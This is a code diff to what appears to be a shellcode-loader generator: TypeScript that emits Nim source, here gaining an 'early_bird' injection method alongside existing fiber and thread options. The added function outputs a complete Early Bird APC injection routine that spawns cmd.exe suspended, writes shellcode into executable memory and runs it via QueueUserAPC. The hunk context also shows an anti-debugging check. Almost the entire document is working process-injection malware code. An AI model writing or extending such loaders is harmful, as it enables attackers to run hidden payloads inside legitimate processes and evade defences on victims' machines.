@@ -151,8 +151,10 @@ proc pebBeingDebugged(): bool {.asmNoStackFrame.}=
             return this.generateFiberInjection();
         } else if (config.injection_method === 'thread') {
             return this.generateThreadInjection();
+        } else if (config.injection_method === 'early_bird') {
+            return this.generateEarlyBirdInjection();
         }
-        // early_bird and process_hollowing not implemented yet
+        // process_hollowing not implemented yet
         return "";
     }
 
@@ -274,6 +276,88 @@ proc injectShellcode(shellcode: seq[byte]) =
     # Cleanup
     discard CloseHandle(hThread)
     discard VirtualFree(memAddr, 0, MEM_RELEASE)
+`;
+    }
+
+    private generateEarlyBirdInjection(): string {
+        return `
+proc injectShellcode(shellcode: seq[byte]) =
+    var 
+        si: STARTUPINFOW
+        pi: PROCESS_INFORMATION
+    
+    si.cb = cast[DWORD](sizeof(si))
+    si.dwFlags = STARTF_USESHOWWINDOW
+    
+    # 1. Create suspended process
+    let success = CreateProcessW(
+        L"C:\\\\Windows\\\\System32\\\\cmd.exe",
+        nil,
+        nil,
+        nil,
+        FALSE,
+        CREATE_SUSPENDED,
+        nil,
+        L"C:\\\\Windows\\\\System32",
+        addr si,
+        addr pi
+    )
+    
+    if success == 0:
+        echo "[-] CreateProcessW failed: ", GetLastError()
+        quit(1)
+    
+    # 2. Allocate memory in remote process
+    let hMemory = VirtualAllocEx(
+        pi.hProcess,
+        nil,
+        cast[SIZE_T](shellcode.len),
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    )
+    
+    if hMemory == nil:
+        echo "[-] VirtualAllocEx failed"
+        discard CloseHandle(pi.hThread)
+        discard CloseHandle(pi.hProcess)
+        quit(1)
+    
+    # 3. Write shellcode to allocated memory
+    var bytesWritten: SIZE_T
+    let writeSuccess = WriteProcessMemory(
+        pi.hProcess,
+        hMemory,
+        addr shellcode[0],
+        cast[SIZE_T](shellcode.len),
+        addr bytesWritten
+    )
+    
+    if writeSuccess == 0:
+        echo "[-] WriteProcessMemory failed"
+        discard CloseHandle(pi.hThread)
+        discard CloseHandle(pi.hProcess)
+        quit(1)
+    
+    # 4. Queue APC to execute shellcode
+    let apcSuccess = QueueUserAPC(
+        cast[PAPCFUNC](hMemory),
+        pi.hThread,
+        0
+    )
+    
+    if apcSuccess == 0:
+        echo "[-] QueueUserAPC failed"
+        discard CloseHandle(pi.hThread)
+        discard CloseHandle(pi.hProcess)
+        quit(1)
+    
+    # 5. Resume thread to execute APC
+    echo "[+] Executing shellcode via Early Bird (APC)..."
+    discard ResumeThread(pi.hThread)
+    
+    # Cleanup
+    discard CloseHandle(pi.hThread)
+    discard CloseHandle(pi.hProcess)
 `;
     }
 
